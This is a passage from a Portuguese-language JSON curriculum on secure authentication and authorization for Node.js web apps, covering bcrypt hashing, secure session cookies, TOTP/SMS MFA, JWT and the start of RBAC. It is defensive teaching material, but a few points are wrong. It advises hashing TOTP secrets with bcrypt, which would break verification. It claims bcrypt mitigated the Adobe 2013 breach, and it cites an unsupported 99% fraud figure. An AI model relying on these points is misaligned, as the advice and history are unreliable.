                        "id": "10.1.5.4.1",
                        "name": "Autenticação Segura",
                        "description": "Conjunto de mecanismos e práticas para verificar de forma confiável a identidade dos usuários em aplicações web, prevenindo acessos não autorizados como brute force e credential stuffing.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.4.1.1",
                            "name": "Implementar hashing de senhas com salting",
                            "description": "Aplicar algoritmos de hash seguros como bcrypt ou Argon2 com salting único por usuário para armazenar senhas de forma irreversível no banco de dados, protegendo contra ataques de rainbow tables e vazamentos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente e instalar bibliotecas de hashing",
                                  "subSteps": [
                                    "Instalar Node.js e npm no sistema.",
                                    "Criar um projeto Node.js com 'npm init -y'.",
                                    "Instalar bcrypt ou Argon2 via 'npm install bcrypt' ou 'npm install argon2'.",
                                    "Configurar um banco de dados simples como SQLite ou MongoDB para testes.",
                                    "Criar estrutura básica de usuário com campos email, senhaHash e salt (se necessário)."
                                  ],
                                  "verification": "Verificar se 'npm list bcrypt' mostra a biblioteca instalada e um script de teste roda sem erros.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Node.js >=14",
                                    "npm",
                                    "VS Code ou editor similar",
                                    "SQLite ou MongoDB"
                                  ],
                                  "tips": "Prefira bcrypt para simplicidade em projetos iniciais; Argon2 para maior segurança em produção.",
                                  "learningObjective": "Preparar o ambiente para implementação segura de hashing.",
                                  "commonMistakes": [
                                    "Usar versões desatualizadas de bibliotecas",
                                    "Ignorar dependências peer como node-gyp para bcrypt"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar função de geração de hash com salting único",
                                  "subSteps": [
                                    "Importar a biblioteca bcrypt no arquivo de utilitários.",
                                    "Criar função async 'hashPassword(password)' que gera salt aleatório e aplica hash.",
                                    "Usar bcrypt.hash(password, 12) para gerar salt e hash em um passo.",
                                    "Armazenar apenas o hash resultante (inclui salt) no banco de dados.",
                                    "Testar função isoladamente com console.log para senhas iguais gerarem hashes diferentes."
                                  ],
                                  "verification": "Executar hash('senha123') duas vezes e confirmar hashes distintos com prefixo '$2b$' ou similar.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Código fonte do projeto",
                                    "Documentação bcrypt: https://www.npmjs.com/package/bcrypt"
                                  ],
                                  "tips": "Cost factor 12 equilibra segurança e performance; aumente para 14+ em servidores potentes.",
                                  "learningObjective": "Dominar geração de hashes irreversíveis com salts únicos por usuário.",
                                  "commonMistakes": [
                                    "Reutilizar salts fixos",
                                    "Armazenar senha e salt separadamente desnecessariamente",
                                    "Usar cost baixo como 4"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integrar hashing no processo de registro de usuário",
                                  "subSteps": [
                                    "Criar rota POST /register em Express.js.",
                                    "Receber email e senha plain-text do body da requisição.",
                                    "Chamar hashPassword(senha) e salvar {email, senhaHash} no banco.",
                                    "Implementar validações: senha mínima 8 chars, email único.",
                                    "Retornar resposta 201 com mensagem de sucesso, sem expor hash."
                                  ],
                                  "verification": "Registrar dois usuários com mesma senha via Postman e inspecionar BD para hashes diferentes.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Express.js instalado",
                                    "Postman ou Insomnia para testes",
                                    "Banco de dados configurado"
                                  ],
                                  "tips": "Nunca logue senhas plain-text; use variáveis de ambiente para DB creds.",
                                  "learningObjective": "Aplicar hashing de forma segura durante criação de contas.",
                                  "commonMistakes": [
                                    "Armazenar senha plain-text",
                                    "Expor hash em respostas HTTP",
                                    "Falta de validação de input"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar verificação de senha no login e realizar testes",
                                  "subSteps": [
                                    "Criar rota POST /login que recebe email e senha.",
                                    "Buscar usuário por email, obter senhaHash do BD.",
                                    "Usar bcrypt.compare(senhaPlain, senhaHash) para validar.",
                                    "Gerar token JWT se válido, retornar 401 se inválido.",
                                    "Testar ataques: rainbow table (senha igual gera falha), força bruta simulada."
                                  ],
                                  "verification": "Login com senha correta succeeds; incorreta falha; hashes de demo não matcham senhas plain.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "jsonwebtoken para tokens",
                                    "Ferramentas de teste como Jest ou manual via Postman"
                                  ],
                                  "tips": "compare() é seguro contra timing attacks; sempre use async/await.",
                                  "learningObjective": "Verificar credenciais sem expor senhas e mitigar ataques comuns.",
                                  "commonMistakes": [
                                    "Comparar hashes diretamente com == em vez de compare()",
                                    "Retornar detalhes de erro no login",
                                    "Não tratar usuário não encontrado"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma API Node.js/Express para e-commerce, usuário registra 'user@email.com' senha 'MinhaSenha123'. Função gera hash '$2b$12$exemploSaltHashAqui...'. No login, bcrypt.compare('MinhaSenha123', hash) retorna true, gera JWT e acessa perfil. Mesma senha em outro usuário gera '$2b$12$outroSaltDiferente...' protegendo contra rainbow tables.",
                              "finalVerifications": [
                                "Hashes gerados incluem salt único e são diferentes para senhas idênticas.",
                                "bcrypt.compare() valida corretamente senhas válidas/inválidas sem timing leaks.",
                                "Nenhuma senha plain-text é armazenada ou logada.",
                                "Banco de dados contém apenas hashes com prefixo bcrypt/Argon2.",
                                "Testes de registro/login funcionam end-to-end via API.",
                                "Simulação de vazamento: hashes não são reversíveis com ferramentas como Hashcat (sem salt personalizado)."
                              ],
                              "assessmentCriteria": [
                                "Uso de algoritmo moderno (bcrypt/Argon2) com cost adequado (>=10).",
                                "Salt gerado automaticamente e único por hash.",
                                "Integração correta em registro (hash antes de salvar) e login (compare()).",
                                "Tratamento seguro de erros sem vazamento de info sensível.",
                                "Código limpo, async, com validações de input.",
                                "Testes demonstram resistência a rainbow tables e reuse de senhas."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Propriedades de funções hash (one-way, colisão-resistente, avalanche effect).",
                                "Ética e Legislação: Conformidade com LGPD/GDPR na proteção de dados pessoais.",
                                "Banco de Dados: Modelagem segura de tabelas de usuários.",
                                "Redes e Sistemas: Integração com HTTPS para evitar MITM na transmissão.",
                                "Desenvolvimento Ágil: Testes unitários para segurança (TDD)."
                              ],
                              "realWorldApplication": "Aplicado em plataformas como Nubank, iFood e Netflix para proteger bilhões de logins contra vazamentos (ex: Adobe 2013 breach mitigado por bcrypt), garantindo confiança de usuários e evitando multas regulatórias."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.4.1.2",
                            "name": "Configurar sessões seguras com cookies",
                            "description": "Utilizar cookies HttpOnly, Secure e SameSite para gerenciar sessões de autenticação, regenerando IDs de sessão após login e implementando timeouts para mitigar session hijacking e fixation.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar atributos de segurança básicos nos cookies de sessão",
                                  "subSteps": [
                                    "Instale e configure uma biblioteca de sessão como express-session em Node.js.",
                                    "Defina o cookie com httpOnly: true para prevenir acesso via JavaScript.",
                                    "Ative secure: true para garantir que cookies só sejam enviados via HTTPS.",
                                    "Configure sameSite: 'strict' ou 'lax' para mitigar CSRF e session fixation.",
                                    "Teste a configuração inicial salvando e lendo a sessão."
                                  ],
                                  "verification": "Inspecione os cookies no DevTools do navegador e confirme a presença dos atributos httpOnly, Secure e SameSite.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Node.js",
                                    "Express.js",
                                    "express-session",
                                    "Navegador com DevTools"
                                  ],
                                  "tips": "Use sameSite: 'strict' para máxima segurança, mas teste usabilidade em fluxos de terceiros.",
                                  "learningObjective": "Compreender e aplicar os atributos HttpOnly, Secure e SameSite para proteger cookies de sessão contra acesso cliente-side e ataques de rede.",
                                  "commonMistakes": [
                                    "Definir secure: true em ambiente de desenvolvimento sem HTTPS proxy.",
                                    "Esquecer httpOnly, permitindo roubo via XSS.",
                                    "Usar sameSite: 'none' sem Secure, violando políticas de navegador."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar regeneração de ID de sessão após autenticação",
                                  "subSteps": [
                                    "Crie uma rota de login que valide credenciais do usuário.",
                                    "Após validação bem-sucedida, chame req.session.regenerate() para gerar novo ID.",
                                    "Armazene o ID de usuário no novo objeto de sessão.",
                                    "Redirecione para dashboard protegido com o novo ID.",
                                    "Registre logs para auditoria da regeneração."
                                  ],
                                  "verification": "Monitore o valor do cookie de sessão antes e após login; confirme que o ID muda.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Código da Step 1",
                                    "Editor de código como VS Code"
                                  ],
                                  "tips": "Regenere sempre após login, logout e ações de privilégio para evitar fixation.",
                                  "learningObjective": "Implementar regeneração de sessão para prevenir session fixation attacks.",
                                  "commonMistakes": [
                                    "Não chamar regenerate() antes de setar dados sensíveis.",
                                    "Reutilizar ID antigo em caso de falha na autenticação.",
                                    "Ignorar erros durante a regeneração."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar timeouts e expiração de sessões",
                                  "subSteps": [
                                    "Defina cookie.maxAge ou session TTL para expiração automática (ex: 30 minutos de inatividade).",
                                    "Implemente lógica de verificação de idade da sessão em middlewares.",
                                    "Adicione extensão de sessão em requests ativos (touch()).",
                                    "Configure invalidação absoluta após X horas.",
                                    "Teste expiração forçando inatividade."
                                  ],
                                  "verification": "Deixe a sessão inativa pelo tempo definido e confirme logout automático ao acessar rota protegida.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Código das Steps anteriores",
                                    "Ferramentas de teste como Postman"
                                  ],
                                  "tips": "Use tempos curtos para sessões sensíveis e permita 'remember me' com tokens separados.",
                                  "learningObjective": "Aplicar timeouts para limitar a janela de ataque em caso de roubo de sessão.",
                                  "commonMistakes": [
                                    "Definir maxAge muito longo, aumentando risco de hijacking.",
                                    "Não invalidar sessões em logout.",
                                    "Esquecer de resetar timer em atividade do usuário."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e validar a configuração contra vetores de ataque comuns",
                                  "subSteps": [
                                    "Simule session hijacking trocando cookie ID e verifique falha de autenticação.",
                                    "Teste fixation tentando fixar ID pré-login.",
                                    "Verifique proteção CSRF com SameSite via formulários cross-site.",
                                    "Use ferramentas como OWASP ZAP para scan de vulnerabilidades de sessão.",
                                    "Documente resultados e ajuste configurações."
                                  ],
                                  "verification": "Execute testes manuais e automatizados; confirme que ataques falham e sessões legítimas funcionam.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Postman ou Insomnia",
                                    "OWASP ZAP ou Burp Suite Community",
                                    "Proxy HTTPS local como mkcert"
                                  ],
                                  "tips": "Sempre teste em HTTPS; use proxies para dev seguro.",
                                  "learningObjective": "Validar implementações de segurança através de testes contra session hijacking e fixation.",
                                  "commonMistakes": [
                                    "Testar só em localhost sem Secure.",
                                    "Ignorar SameSite em navegadores modernos.",
                                    "Não testar regeneração em cenários de falha."
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma aplicação Node.js/Express para e-commerce: Instale express-session, configure session({ secret: 'key', cookie: { httpOnly: true, secure: process.env.NODE_ENV === 'production', sameSite: 'lax', maxAge: 30*60*1000 } }). Após login com bcrypt.compare, chame await new Promise((res,rej)=>req.session.regenerate(err=>{if(err)rej(err);else res()})) e req.session.userId = user.id. Middleware verifica if (!req.session || Date.now() - req.session.created > 2*60*60*1000) req.session.destroy().",
                              "finalVerifications": [
                                "Cookies exibem httpOnly, Secure (em HTTPS) e SameSite no DevTools.",
                                "ID de sessão muda após login bem-sucedido.",
                                "Sessão expira automaticamente após timeout de inatividade.",
                                "Tentativas de hijacking com ID antigo falham.",
                                "SameSite previne CSRF em testes cross-site.",
                                "Logout invalida sessão imediatamente."
                              ],
                              "assessmentCriteria": [
                                "Código usa todos os atributos de cookie corretamente sem hardcoding inseguro.",
                                "Regeneração é chamada exclusivamente após autenticação válida.",
                                "Timeouts são configurados com valores razoáveis e testados.",
                                "Testes cobrem vetores principais com evidências (screenshots/logs).",
                                "Código é limpo, comentado e segue best practices (ex: async/await).",
                                "Nenhuma vulnerabilidade crítica identificada em scans."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Integração com HTTPS/TLS para Secure flag.",
                                "Redes: Compreensão de headers HTTP e políticas de navegador.",
                                "Desenvolvimento Ágil: Implementação de middlewares e testes unitários.",
                                "Ética em TI: Mitigação de riscos de privacidade e segurança de dados.",
                                "Banco de Dados: Armazenamento seguro de hashes de sessão."
                              ],
                              "realWorldApplication": "Em plataformas como bancos online (ex: Nubank) ou e-commerces (ex: Amazon), configurações seguras de cookies previnem milhões de dólares em fraudes por session hijacking, garantindo que sessões roubadas expirem rapidamente e não sejam fixadas por atacantes."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.4.1.3",
                            "name": "Integrar Multi-Fator Autenticação (MFA)",
                            "description": "Incorporar MFA usando TOTP (ex: Google Authenticator) ou SMS como segunda camada de verificação, configurando fluxos de fallback e recovery codes para equilibrar segurança e usabilidade.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Planejar e configurar o ambiente para integração de MFA com TOTP",
                                  "subSteps": [
                                    "Estude o funcionamento do TOTP (Time-based One-Time Password) baseado em HMAC-SHA1.",
                                    "Escolha bibliotecas: instale speakeasy (para Node.js) ou pyotp (Python) via npm/pip.",
                                    "Configure um banco de dados para armazenar secrets de usuário de forma segura (hash com bcrypt).",
                                    "Defina fluxos: enrollment (gerar QR), verificação e fallback.",
                                    "Crie endpoints básicos de autenticação no backend (ex: /login, /mfa-enroll)."
                                  ],
                                  "verification": "Bibliotecas instaladas e endpoint de enrollment gera um secret válido e QR code legível.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Node.js ou Python",
                                    "Bibliotecas: speakeasy/pyotp, qrcode",
                                    "Banco de dados: MongoDB/PostgreSQL"
                                  ],
                                  "tips": "Use variáveis de ambiente para chaves secretas e sempre teste em ambiente de desenvolvimento.",
                                  "learningObjective": "Compreender os princípios criptográficos do TOTP e preparar o ambiente técnico.",
                                  "commonMistakes": [
                                    "Armazenar secrets em texto plano",
                                    "Ignorar rate limiting nos endpoints",
                                    "Não validar tempo do token (janela de 30s)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar o enrollment e geração de QR code para TOTP",
                                  "subSteps": [
                                    "No backend, gere secret único por usuário com speakeasy.generateSecret().",
                                    "Crie QR code com secret usando qrcode library e retorne URL base64 para frontend.",
                                    "No frontend, exiba QR code após login inicial bem-sucedido.",
                                    "Salve secret hasheado no banco associado ao userID.",
                                    "Gere 10 recovery codes aleatórios (hash e armazene) para o usuário."
                                  ],
                                  "verification": "Usuário escaneia QR com Google Authenticator e vê código sincronizado; recovery codes são gerados e exibidos uma vez.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Google Authenticator app",
                                    "Biblioteca qrcode",
                                    "Frontend: HTML/JS ou React"
                                  ],
                                  "tips": "Inclua instruções claras no UI para escanear QR e salvar recovery codes.",
                                  "learningObjective": "Dominar o processo de enrollment seguro de MFA.",
                                  "commonMistakes": [
                                    "Expor secret no log ou response",
                                    "Não forçar re-enrollment após uso de recovery",
                                    "QR code com issuer/name incorreto"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar verificação de MFA no fluxo de login",
                                  "subSteps": [
                                    "Após login email/senha, redirecione para /mfa-verify se MFA ativado.",
                                    "No backend, valide código TOTP com speakeasy.totp.verify({secret, token, window: 2}).",
                                    "Se válido, crie sessão JWT com flag MFA e redirecione para dashboard.",
                                    "Adicione rate limiting (ex: 5 tentativas/5min) para evitar brute force.",
                                    "No frontend, crie form para input de 6 dígitos com timer visual."
                                  ],
                                  "verification": "Login com código TOTP válido concede acesso completo; inválido bloqueia após tentativas.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "JWT library (jsonwebtoken)",
                                    "Rate limiter (express-rate-limit)"
                                  ],
                                  "tips": "Use janela de tempo (window: 2) para tolerar clocks dessincronizados.",
                                  "learningObjective": "Implementar verificação segura e user-friendly de TOTP.",
                                  "commonMistakes": [
                                    "Não invalidar sessão após falhas",
                                    "Verificar sem window de tempo",
                                    "Revelar se MFA está ativado em erros"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar fallback SMS e recovery codes com testes de usabilidade",
                                  "subSteps": [
                                    "Após 3 falhas TOTP, ofereça fallback SMS: integre Twilio/Nexmo para enviar OTP.",
                                    "Gere OTP de 6 dígitos válido por 5min e valide similar ao TOTP.",
                                    "Implemente uso de recovery codes: valide hash, invalide após uso e force re-enrollment.",
                                    "Teste fluxos completos: sucesso TOTP, fallback SMS, recovery, bloqueio.",
                                    "Adicione logs de auditoria para tentativas de MFA."
                                  ],
                                  "verification": "Fallback SMS envia código funcional; recovery code único é consumido; app equilibra segurança/usabilidade.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Twilio account (sandbox)",
                                    "Biblioteca Twilio SDK"
                                  ],
                                  "tips": "Teste com números virtuais; inclua opção 'perdi acesso' para admin reset.",
                                  "learningObjective": "Equilibrar segurança com recuperação acessível em cenários de falha.",
                                  "commonMistakes": [
                                    "SMS sem rate limit",
                                    "Recovery codes reutilizáveis",
                                    "Não notificar usuário por email sobre uso de recovery"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma aplicação web de banco online (Node.js/Express + React), após login com email/senha, o usuário escaneia QR para ativar MFA via Google Authenticator. Na próxima login, insere código TOTP; se falhar 3x, recebe SMS via Twilio com OTP fallback. Recovery codes são gerados no enrollment e salvos pelo usuário.",
                              "finalVerifications": [
                                "Aplicação gera QR válido e verifica TOTP corretamente com janela de tempo.",
                                "Fallback SMS é acionado após falhas e OTP é validado.",
                                "Recovery codes são únicos, hasheados e invalidados após uso.",
                                "Rate limiting previne brute force em todos fluxos.",
                                "Sessão só é criada após MFA bem-sucedido.",
                                "Logs registram todas tentativas sem expor secrets."
                              ],
                              "assessmentCriteria": [
                                "Correção criptográfica: secrets hasheados, TOTP com HMAC válido.",
                                "Segurança: rate limiting, auditoria e invalidação de códigos.",
                                "Usabilidade: UI intuitiva com timers, instruções e fallbacks.",
                                "Robustez: testes cobrem sucesso, falha, recovery e edge cases.",
                                "Código limpo: modular, com comentários e error handling.",
                                "Performance: verificações rápidas (<500ms)."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: HMAC-SHA1 e hashing de secrets.",
                                "Design de UX/UI: Interfaces seguras e acessíveis.",
                                "Gestão de dados: Privacidade e conformidade GDPR.",
                                "Redes e APIs: Integração com serviços SMS como Twilio.",
                                "Ética e segurança: Balanceamento risco/usabilidade."
                              ],
                              "realWorldApplication": "Bancos como Nubank e Itaú usam MFA com TOTP/SMS para proteger transações; serviços como Google e Microsoft integram recovery codes para evitar lockouts, reduzindo fraudes em 99% contra roubo de senha."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.4.1.4",
                            "name": "Usar tokens JWT para autenticação stateless",
                            "description": "Gerar e validar JSON Web Tokens (JWT) com assinaturas HS256/RS256, incluindo claims como expiração e issuer, para autenticação em APIs REST sem estado de sessão no servidor.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a estrutura e conceitos básicos do JWT",
                                  "subSteps": [
                                    "Estude a estrutura de um JWT: Header, Payload e Signature.",
                                    "Aprenda sobre claims padrão (iss, sub, aud, exp, nbf, iat) e customizados.",
                                    "Diferencie autenticação stateless de session-based.",
                                    "Analise exemplos de tokens JWT em jwt.io.",
                                    "Entenda algoritmos de assinatura: HS256 (simétrica) e RS256 (assimétrica)."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito a composição de um JWT e liste 5 claims com exemplos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Site jwt.io",
                                    "Documentação oficial do JWT (jwt.io/introduction)"
                                  ],
                                  "tips": "Use jwt.io para decodificar tokens reais e visualizar partes separadamente.",
                                  "learningObjective": "Identificar e descrever todos os componentes de um JWT e seu propósito em autenticação stateless.",
                                  "commonMistakes": [
                                    "Confundir payload com dados não assinados",
                                    "Ignorar expiração (exp) levando a tokens perpétuos",
                                    "Não diferenciar HS256 de RS256"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Instalar e configurar biblioteca JWT em um ambiente de desenvolvimento",
                                  "subSteps": [
                                    "Instale Node.js e inicialize um projeto com npm init.",
                                    "Instale a biblioteca jsonwebtoken via npm install jsonwebtoken.",
                                    "Configure chaves secretas para HS256 (string) e gere par de chaves para RS256 (openssl).",
                                    "Crie um arquivo de configuração com variáveis de ambiente para segredos.",
                                    "Teste importação da biblioteca com um script simples."
                                  ],
                                  "verification": "Execute um script que importa jsonwebtoken sem erros e exibe versão.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Node.js >=14",
                                    "npm",
                                    "Editor de código (VS Code)",
                                    "OpenSSL para RS256"
                                  ],
                                  "tips": "Use dotenv para gerenciar secrets em .env e nunca commite-os no Git.",
                                  "learningObjective": "Configurar ambiente pronto para geração e validação de JWTs com diferentes algoritmos.",
                                  "commonMistakes": [
                                    "Expor secrets em código fonte",
                                    "Usar chaves fracas para HS256",
                                    "Esquecer de instalar dependências"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Gerar um token JWT com claims apropriados",
                                  "subSteps": [
                                    "Defina payload com claims: iss, sub (userId), exp (24h), iat.",
                                    "Use jwt.sign() com algoritmo HS256 e secret.",
                                    "Adicione claims customizados como roles ou permissions.",
                                    "Teste geração em um script Node.js e decodifique em jwt.io.",
                                    "Implemente função reutilizável para geração de tokens."
                                  ],
                                  "verification": "Gere token, decodifique e confirme presença de todos claims esperados.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Projeto Node.js do step 2",
                                    "jwt.io para debug"
                                  ],
                                  "tips": "Calcule exp como Math.floor(Date.now() / 1000) + (60 * 60 * 24).",
                                  "learningObjective": "Criar tokens JWT seguros com expiração e issuer corretos.",
                                  "commonMistakes": [
                                    "Não definir exp levando a tokens imortais",
                                    "Payload muito grande impactando performance",
                                    "Assinatura com algoritmo none"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar e decodificar um token JWT",
                                  "subSteps": [
                                    "Use jwt.verify() com secret e opções {algorithms: ['HS256']}.",
                                    "Trate erros comuns: TokenExpiredError, JsonWebTokenError.",
                                    "Extraia claims do payload validado.",
                                    "Teste cenários: token válido, expirado, inválido, assinatura errada.",
                                    "Crie função de middleware para validação."
                                  ],
                                  "verification": "Valide tokens de teste e logue erros para cenários falhos.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Projeto Node.js",
                                    "Tokens gerados no step 3"
                                  ],
                                  "tips": "Sempre especifique algorithms para evitar downgrade attacks.",
                                  "learningObjective": "Implementar validação robusta que rejeite tokens inválidos ou expirados.",
                                  "commonMistakes": [
                                    "Não tratar erros de verificação",
                                    "Aceitar any algorithm",
                                    "Expor payload sem verificar signature"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Integrar JWT em uma API REST para autenticação stateless",
                                  "subSteps": [
                                    "Instale Express: npm install express.",
                                    "Crie endpoint /login que gera JWT após 'autenticação' mock.",
                                    "Crie endpoint protegido /profile com middleware de validação JWT.",
                                    "Teste com Postman: login -> obter token -> acessar /profile com Bearer token.",
                                    "Adicione logout lógico (blacklist ou short exp + refresh tokens)."
                                  ],
                                  "verification": "Acesse /profile sem token (401), com token válido (200), com expirado (401).",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Express.js",
                                    "Postman ou Insomnia"
                                  ],
                                  "tips": "Use header Authorization: Bearer <token> padrão.",
                                  "learningObjective": "Desenvolver API stateless com autenticação JWT completa.",
                                  "commonMistakes": [
                                    "Armazenar sessão no servidor",
                                    "Não validar issuer/audience",
                                    "Tokens longos sem refresh"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma API Node.js com Express, crie /login (POST) que recebe email/senha mock, gera JWT com userId e roles, retorna token. Proteja /users (GET) com middleware que verifica JWT do header Authorization, extrai userId e responde dados mock se válido.",
                              "finalVerifications": [
                                "Gere e decodifique JWT com claims corretos (iss, exp, sub).",
                                "Validação rejeita token expirado com erro apropriado.",
                                "API endpoint protegido acessível apenas com token válido.",
                                "Teste HS256 e RS256 com chaves adequadas.",
                                "Explique stateless: servidor não armazena sessão.",
                                "Identifique e corrija um token malformado."
                              ],
                              "assessmentCriteria": [
                                "Token gerado inclui expiração <24h e issuer correto.",
                                "Validação rejeita 100% dos tokens inválidos/expirados.",
                                "Integração em API sem vazamento de dados sensíveis.",
                                "Código usa secrets de ambiente e especifica algorithms.",
                                "Tratamento completo de erros JWT.",
                                "Performance: token decode <10ms."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Assinaturas digitais HS256/RS256.",
                                "Desenvolvimento Web: APIs REST e middlewares Express.",
                                "Segurança da Informação: OWASP Top 10 (Broken Authentication).",
                                "Banco de Dados: Armazenamento opcional de refresh tokens.",
                                "Redes: Headers HTTP e HTTPS obrigatório."
                              ],
                              "realWorldApplication": "Implementado em SPAs (React/Angular) com backends Node.js/Go para login único; microsserviços (Kubernetes) para federação de identidade; OAuth2 flows em apps como Spotify, onde tokens stateless escalam sem sessões no servidor."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.4.2",
                        "name": "Autorização Segura",
                        "description": "Processos para controlar o acesso de usuários autenticados a recursos específicos, baseados em papéis, permissões e políticas, garantindo o princípio do menor privilégio.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.4.2.1",
                            "name": "Implementar Role-Based Access Control (RBAC)",
                            "description": "Definir papéis (roles) e associá-los a usuários e permissões, verificando-os em middlewares de API ou guards de rotas para restringir acesso a endpoints sensíveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Modelar Roles e Permissões no Banco de Dados",
                                  "subSteps": [
                                    "Crie tabelas para roles (id, name) e permissions (id, name, action, resource).",
                                    "Estabeleça tabela de junção role_permissions (role_id, permission_id).",
                                    "Defina roles comuns como 'admin', 'user', 'guest'.",
                                    "Crie permissões como 'read:posts', 'write:posts', 'delete:posts'.",
                                    "Insira dados iniciais com seeds ou migrations."
                                  ],
                                  "verification": "Execute queries SQL para listar roles, permissions e associações; confirme que dados estão corretos sem duplicatas.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "Banco de dados (PostgreSQL/MySQL)",
                                    "Ferramenta ORM como Sequelize/Prisma",
                                    "Documentação do banco"
                                  ],
                                  "tips": "Use chaves estrangeiras para integridade referencial e índices para performance em consultas.",
                                  "learningObjective": "Entender como estruturar dados para RBAC de forma escalável e normalizada.",
                                  "commonMistakes": [
                                    "Não normalizar (roles e perms em uma tabela)",
                                    "Esquecer índices em foreign keys",
                                    "Criar roles sem permissões associadas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Associar Roles a Usuários",
                                  "subSteps": [
                                    "Crie tabela user_roles (user_id, role_id) com unique constraint em (user_id, role_id).",
                                    "Atualize modelo de usuário para incluir relação many-to-many com roles.",
                                    "Implemente endpoint para atribuir role a usuário (ex: POST /users/:id/roles).",
                                    "Garanta que apenas admins possam atribuir roles via middleware preliminar.",
                                    "Adicione validação para evitar múltiplas roles conflitantes."
                                  ],
                                  "verification": "Crie um usuário, associe role 'admin' e 'user'; query confirme associações sem erros.",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "ORM ou query builder",
                                    "Código base de autenticação existente",
                                    "Postman para testes"
                                  ],
                                  "tips": "Permita múltiplas roles por usuário para flexibilidade (ex: user + moderator).",
                                  "learningObjective": "Implementar associações dinâmicas entre usuários e roles com validações.",
                                  "commonMistakes": [
                                    "Permitir auto-atribuição de roles sem checagem",
                                    "Não usar unique constraints levando a duplicatas",
                                    "Ignorar herança de roles"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Middleware/Guard para Verificação de Roles",
                                  "subSteps": [
                                    "Crie função utilitária para extrair roles do JWT payload ou sessão do usuário.",
                                    "Desenvolva middleware checkRole(roleName) que query roles do usuário e compara.",
                                    "Crie middleware checkPermission(action, resource) que verifica permissões associadas às roles.",
                                    "Integre com autenticação existente (ex: após verifyJWT).",
                                    "Adicione logging para tentativas de acesso negado."
                                  ],
                                  "verification": "Teste middleware isoladamente com mocks; retorne 403 para roles inválidas.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "Framework (Express.js/NestJS)",
                                    "Biblioteca JWT (jsonwebtoken)",
                                    "Exemplo de middleware base"
                                  ],
                                  "tips": "Cache roles do usuário em sessão para evitar queries repetidas por request.",
                                  "learningObjective": "Construir middlewares reutilizáveis para autorização baseada em roles e permissões.",
                                  "commonMistakes": [
                                    "Não decodificar JWT corretamente",
                                    "Query desnecessária por request sem cache",
                                    "Retornar 401 em vez de 403 para autorização falha"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar RBAC em Rotas e Testar Acesso Restrito",
                                  "subSteps": [
                                    "Aplique middlewares em rotas sensíveis (ex: app.delete('/posts/:id', checkRole('admin'), deletePost)).",
                                    "Crie rotas de teste para admin (delete), user (read/write), guest (read only).",
                                    "Teste com diferentes usuários e tokens JWT simulando roles.",
